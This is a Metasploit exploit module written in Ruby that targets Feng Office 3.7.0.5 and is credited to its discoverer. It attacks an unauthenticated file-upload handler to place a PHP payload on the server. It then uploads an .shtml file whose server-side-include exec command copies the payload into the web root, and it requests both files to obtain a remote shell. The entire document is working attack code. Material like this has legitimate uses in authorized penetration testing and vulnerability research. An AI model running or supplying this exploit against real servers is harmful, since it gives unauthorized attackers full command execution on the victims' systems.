# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;uri&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

    def initialize
    super(
      &#039;Name&#039;           => &#039;Feng Office 3.7.0.5 - (Unauthenticated) Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits arbitrary file upload vulnerability in Feng Office 3.7.0.5. 
        Application allows the unauthenticated users to upload arbitrary files. 
        There is no control of any session. All files are sent under "/tmp" directory.
        This exploit creates the php payload and moves the payload to the main directory via "shtml".
        After moving the php payload to the main directory, Exploit executes payload and receives shell.
      },
      &#039;Author&#039;         => [
        &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Vulnerability Discovery, PoC & Msf Module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.com.tr/exploits/Feng-Office-3-7-0-5-Unauthenticated-Remote-Command-Execution-Metasploit.html&#039;], 
        ],
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;Feng Office  <= 3.7.0.5&#039;, {}]
        ],
      &#039;DisclosureDate&#039; => &#039;28 Feb 2019&#039;,
      &#039;Privileged&#039;     => false,      
      &#039;DefaultTarget&#039; => 0
       )

    register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Feng Office&#039;, &#039;/&#039;]),
        ], self.class)
    end

  def exploit 
##
# Upload Payload and directory discovery
## 
    boundary = Rex::Text.rand_text_alphanumeric(29)
    
    data = "-----------------------------{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"upload\"; filename=\"akkus.php\"\r\n"
    data << "Content-Type: binary/octet-stream\r\n\r\n"
    data << payload.encoded
    data << "\n\r\n-----------------------------{boundary}--\r\n"


    data << "-----------------------------{boundary}--\r\n"

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => data,
      &#039;headers&#039; =>
      {
        &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=---------------------------{boundary}&#039;
      },
      &#039;uri&#039; => normalize_uri(target_uri, "/ck_upload_handler.php")     
    })


        if not (res and res.body =~ /tmp\/([^\"]+)\&#039;,/)
            print_error("Something went wrong. PHP File Upload failed.")
            return nil
        end
    upfile = $1
    print_status("PHP Payload: #{upfile}")

    updir = res.body.scan(/<b>.+ck_upload_handler.php/).map{ |s| s.split("in ").last }.map{ |s| s.split("<b>").last }.map{ |s| s.split("ck_upload_handler.php").last }
    dirc = updir[0]
    print_status("Application Directory Path: #{dirc}")
##
# Upload shtml and run CMD command to move Payload to the main directory
## 

    data = "-----------------------------{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"upload\"; filename=\"akkus.shtml\"\r\n"
    data << "Content-Type: text/html\r\n\r\n<html>\r\n<!--#exec cmd=\""
    data << "cp #{dirc}tmp/#{upfile} #{dirc}"
    data << "\" -->\r\n</html>\n\r\n"
    data << "-----------------------------{boundary}--\r\n"

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => data,
      &#039;headers&#039; =>
      {
        &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=---------------------------{boundary}&#039;
      },
      &#039;uri&#039; => normalize_uri(target_uri, "/ck_upload_handler.php")     
    })

        if not (res and res.body =~ /tmp\/([^\"]+)\&#039;,/)
            print_error("Something went wrong. sHTML file Upload failed.")
            return nil
        else
          print_good("Uploads successful completed.") 
        end
    upfile2 = $1
    print_status("SHTML Payload: #{upfile2}")
    print_good("#{peer} - Retrieving remote command shell...")
    
##
# Running shtml for file migration
##             
    send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri, "/tmp/#{upfile2}"),
    })
##
# Running php for remote shell
##     
    send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri, "/#{upfile}"),
    })
   
  end    
end
##
# End
##

